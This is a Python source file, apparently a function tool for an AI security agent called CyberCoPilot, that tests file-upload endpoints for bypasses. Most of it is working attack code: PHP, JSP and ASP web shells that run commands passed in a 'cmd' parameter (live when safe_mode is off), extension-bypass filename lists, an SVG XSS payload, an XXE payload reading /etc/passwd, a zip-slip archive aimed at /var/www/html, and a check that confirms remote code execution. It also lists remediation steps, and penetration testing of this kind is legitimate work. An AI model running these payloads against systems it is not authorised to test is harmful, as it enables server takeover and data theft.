"""
File Upload Security Testing

Attempts to bypass upload restrictions and plant web shells via:
  - Extension bypass (double ext, null byte, case variation)
  - MIME type confusion
  - Polyglot files (valid image header + PHP/JSP payload)
  - SVG XSS via upload
  - XXE via SVG/XLSX upload
  - Zip-slip (archive traversal)
  - ImageMagick RCE (CVE-2016-3714) via uploaded image
  - Safe mode: generates payloads without live exploitation unless confirmed
"""

from __future__ import annotations

import io
import logging
import zipfile
from typing import Optional

import requests

from src.sdk.tool import function_tool

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)"}
_TIMEOUT = 20
logger = logging.getLogger(__name__)

# ── Minimal valid image headers ───────────────────────────────────────────────
_GIF_HEADER = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
_PNG_HEADER = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02"
    b"\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc\xf8\x0f\x00"
    b"\x00\x01\x01\x00\x05\x18\xd8N\x00\x00\x00\x00IEND\xaeB`\x82"
)
_JPEG_HEADER = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"


def _upload(url: str, field: str, filename: str, content: bytes,
            mime: str, cookies: str = "", extra_fields: dict | None = None) -> Optional[requests.Response]:
    headers = {**_DEFAULT_HEADERS}
    if cookies:
        headers["Cookie"] = cookies
    files = {field: (filename, content, mime)}
    data = extra_fields or {}
    try:
        return requests.post(url, headers=headers, files=files, data=data,
                             timeout=_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        logger.debug(f"_upload error: {e}")
        return None


def _check_shell(url: str, cookies: str = "") -> Optional[str]:
    """Try to confirm shell upload by fetching likely paths."""
    headers = {**_DEFAULT_HEADERS}
    if cookies:
        headers["Cookie"] = cookies
    try:
        r = requests.get(url, headers=headers, timeout=10, verify=False)
        if r.status_code == 200 and len(r.text or "") > 5:
            return r.text[:200]
    except Exception:
        pass
    return None


@function_tool()
def file_upload_bypass(
    upload_url: str,
    upload_field: str = "file",
    check_url_template: str = "",
    cookies: str = "",
    payload_type: str = "php",
    safe_mode: bool = True,
) -> str:
    """
    Test file upload endpoints for security bypass vulnerabilities.

    Attempts extension bypass, MIME confusion, polyglot shell, SVG XSS,
    XXE via SVG/XLSX, zip-slip, and ImageMagick RCE.

    Args:
        upload_url: The file upload endpoint (e.g. https://target.com/api/upload)
        upload_field: Form field name for the file input (default: 'file')
        check_url_template: URL to verify upload success — use {filename} placeholder
                            (e.g. https://target.com/uploads/{filename})
                            Leave empty to skip execution check
        cookies: Session cookies for authenticated uploads
        payload_type: Shell payload type — php | jsp | asp | aspx (default: php)
        safe_mode: If True, use benign payloads (no real shell). Set False only on
                   targets you own (default: True)

    Returns:
        File upload bypass results with accessible shell paths
    """
    if not upload_url or upload_url.strip() == "":
        return "ERROR: `upload_url` argument is required but was empty. Please provide the target endpoint URL."
    if not upload_url.startswith("http://") and not upload_url.startswith("https://"):
        return f"ERROR: Invalid `upload_url` '{upload_url}'. Must start with http:// or https://"
    
    out = [f"=== File Upload Bypass: {upload_url}", f"  Field   : {upload_field}",
           f"  Payload : {payload_type}  safe_mode={safe_mode}", ""]
    findings = []

    # ── Define shell content ──────────────────────────────────────────────────
    if safe_mode:
        php_shell = b"<?php echo 'CyberCoPilot_SAFE_' . md5('upload_verify'); ?>"
        jsp_shell = b"<% out.print(\"CyberCoPilot_SAFE_\" + \"upload\"); %>"
        asp_shell = b"<% Response.Write(\"CyberCoPilot_SAFE_upload\") %>"
    else:
        php_shell = b"<?php system($_GET['cmd']); ?>"
        jsp_shell = b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
        asp_shell = b'<% Dim oS\nSet oS=Server.CreateObject("WSCRIPT.SHELL")\nCall oS.Run(Request("cmd"),0,True) %>'

    shells = {"php": php_shell, "jsp": jsp_shell, "asp": asp_shell, "aspx": asp_shell}
    shell_content = shells.get(payload_type.lower(), php_shell)

    # ── Extension bypass test matrix ──────────────────────────────────────────
    out.append("── Phase 1: Extension Bypass ──────────────────")
    ext_tests = []

    if payload_type.lower() == "php":
        ext_tests = [
            ("shell.php",          b"image/jpeg"),
            ("shell.PHP",          b"image/jpeg"),
            ("shell.php5",         b"image/jpeg"),
            ("shell.php7",         b"image/jpeg"),
            ("shell.phtml",        b"image/jpeg"),
            ("shell.pHp",          b"image/jpeg"),
            ("shell.php.jpg",      b"image/jpeg"),
            ("shell.php%00.jpg",   b"image/jpeg"),
            ("shell.php;.jpg",     b"image/jpeg"),
            ("shell.php::$DATA",   b"image/jpeg"),   # NTFS ADS
            ("shell.php..",        b"image/jpeg"),
            (".htaccess",          b"image/jpeg"),   # Override MIME type
        ]
    elif payload_type.lower() == "jsp":
        ext_tests = [
            ("shell.jsp",          b"image/jpeg"),
            ("shell.JSP",          b"image/jpeg"),
            ("shell.jspx",         b"image/jpeg"),
            ("shell.jsp.jpg",      b"image/jpeg"),
            ("shell.jsp%00.jpg",   b"image/jpeg"),
        ]
    elif payload_type.lower() in ("asp", "aspx"):
        ext_tests = [
            ("shell.aspx",         b"image/jpeg"),
            ("shell.ASPX",         b"image/jpeg"),
            ("shell.asp",          b"image/jpeg"),
            ("shell.asp;.jpg",     b"image/jpeg"),
            ("shell.cer",          b"image/jpeg"),
            ("shell.ashx",         b"image/jpeg"),
        ]

    uploaded_files = []

    for filename, mime_bytes in ext_tests:
        mime = mime_bytes.decode()
        # Polyglot: GIF header + shell code
        content = _GIF_HEADER + shell_content
        r = _upload(upload_url, upload_field, filename, content, mime, cookies)
        if r is None:
            out.append(f"  [{filename}] no response")
            continue

        body = r.text or ""
        success_indicators = ["success", "uploaded", "file saved", "ok", filename.lower().replace("%00", "")]
        blocked_indicators = ["blocked", "invalid", "not allowed", "rejected", "error", "forbidden"]

        is_success = (r.status_code in (200, 201, 202) and
                      any(ind in body.lower() for ind in success_indicators))
        is_blocked = any(ind in body.lower() for ind in blocked_indicators)

        if is_success and not is_blocked:
            uploaded_files.append(filename)
            findings.append(
                f"HIGH → Upload bypass: '{filename}' (MIME: {mime}) accepted "
                f"(HTTP {r.status_code}). Possible web shell upload."
            )
            out.append(f"  [{filename}] ← UPLOADED (HTTP {r.status_code}) — BYPASS SUCCESS")
        else:
            out.append(f"  [{filename}] HTTP {r.status_code} {' — blocked' if is_blocked else ''}")

    # ── Phase 2: MIME-only bypass (correct ext, wrong MIME) ───────────────────
    out.append("")
    out.append("── Phase 2: MIME-Only Bypass ──────────────────")
    mime_tests = [
        ("legit.jpg", shell_content, "image/jpeg"),
        ("legit.png", shell_content, "image/png"),
        ("legit.gif", _GIF_HEADER + shell_content, "image/gif"),
        ("legit.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml"),
    ]
    for filename, content, mime in mime_tests:
        r = _upload(upload_url, upload_field, filename, content, mime, cookies)
        if r and r.status_code in (200, 201) and "error" not in (r.text or "").lower():
            uploaded_files.append(filename)
            findings.append(
                f"MEDIUM → MIME bypass: '{filename}' with mime='{mime}' accepted. "
                "Check if file is served/executed."
            )
            out.append(f"  [{filename}] ← UPLOADED mime={mime}")
        elif r:
            out.append(f"  [{filename}] HTTP {r.status_code}")

    # ── Phase 3: SVG XSS ─────────────────────────────────────────────────────
    out.append("")
    out.append("── Phase 3: SVG XSS Upload ───────────────────")
    svg_xss = b'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">alert('CyberCoPilot_XSS_via_SVG_upload');</script>
</svg>'''
    r = _upload(upload_url, upload_field, "image.svg", svg_xss, "image/svg+xml", cookies)
    if r and r.status_code in (200, 201):
        findings.append(
            "HIGH → SVG upload accepted — if served with Content-Type: image/svg+xml, "
            "JavaScript in SVG will execute (XSS via file upload)."
        )
        out.append(f"  [image.svg] ← UPLOADED HTTP {r.status_code} — check if served as SVG")
    elif r:
        out.append(f"  [image.svg] HTTP {r.status_code} — rejected")

    # ── Phase 4: XXE via SVG ─────────────────────────────────────────────────
    out.append("")
    out.append("── Phase 4: XXE via SVG Upload ────────────────")
    svg_xxe = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>'''
    r = _upload(upload_url, upload_field, "xxe.svg", svg_xxe, "image/svg+xml", cookies)
    if r and r.status_code in (200, 201):
        body = r.text or ""
        if "root:" in body or "daemon:" in body:
            findings.append(
                "CRITICAL → XXE via SVG upload confirmed — /etc/passwd content in response! "
                "Server parses external entities in uploaded SVG files."
            )
            out.append("  [xxe.svg] XXE CONFIRMED — /etc/passwd data in response!")
        else:
            findings.append(
                "HIGH → SVG XXE payload uploaded (HTTP 200). "
                "Check response for file contents — blind XXE may need OAST."
            )
            out.append("  [xxe.svg] ← UPLOADED (no immediate XXE output — may be blind)")
    elif r:
        out.append(f"  [xxe.svg] HTTP {r.status_code}")

    # ── Phase 5: Zip Slip ─────────────────────────────────────────────────────
    out.append("")
    out.append("── Phase 5: Zip Slip (Archive Traversal) ──────")
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../../../var/www/html/shell.php",
                    "<?php echo md5('CyberCoPilot_zip_slip'); ?>")
        zf.writestr("normal.txt", "legitimate file content")
    zip_content = zip_buf.getvalue()

    r = _upload(upload_url, upload_field, "archive.zip", zip_content, "application/zip", cookies)
    if r and r.status_code in (200, 201):
        findings.append(
            "HIGH → Zip archive uploaded — if server extracts without path validation, "
            "ZIP slip (path traversal via archive) could write to /var/www/html/shell.php."
        )
        out.append("  [archive.zip] ← UPLOADED — check if server extracts archives")
    elif r:
        out.append(f"  [archive.zip] HTTP {r.status_code}")

    # ── Phase 6: Execution check ──────────────────────────────────────────────
    if check_url_template and uploaded_files:
        out.append("")
        out.append("── Phase 6: Shell Execution Check ─────────────")
        for fname in uploaded_files[:5]:
            check_url = check_url_template.replace("{filename}", fname)
            result = _check_shell(check_url, cookies)
            if result:
                if "CyberCoPilot" in result or "uid=" in result:
                    findings.append(
                        f"CRITICAL → Remote Code Execution confirmed! "
                        f"Uploaded '{fname}' is accessible and executing: {check_url}\n"
                        f"  Server output: {result[:150]}"
                    )
                    out.append(f"  [{fname}] EXECUTION CONFIRMED: {check_url}")
                else:
                    out.append(f"  [{fname}] HTTP 200 at {check_url} — shell accessible but output unclear")
            else:
                out.append(f"  [{fname}] Not reachable at {check_url}")

    # ── Summary ───────────────────────────────────────────────────────────────
    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        out.extend(findings)
        out.append("")
        out.append("Remediation:")
        out.append("  • Validate file extension against allowlist (not blocklist)")
        out.append("  • Validate MIME type by reading file magic bytes server-side")
        out.append("  • Store uploads outside web root")
        out.append("  • Rename files on upload (remove user-controlled filename)")
        out.append("  • Disable execution in upload directory (.htaccess / Nginx config)")
    else:
        out.append("No file upload bypasses detected.")

    return "\n".join(out)
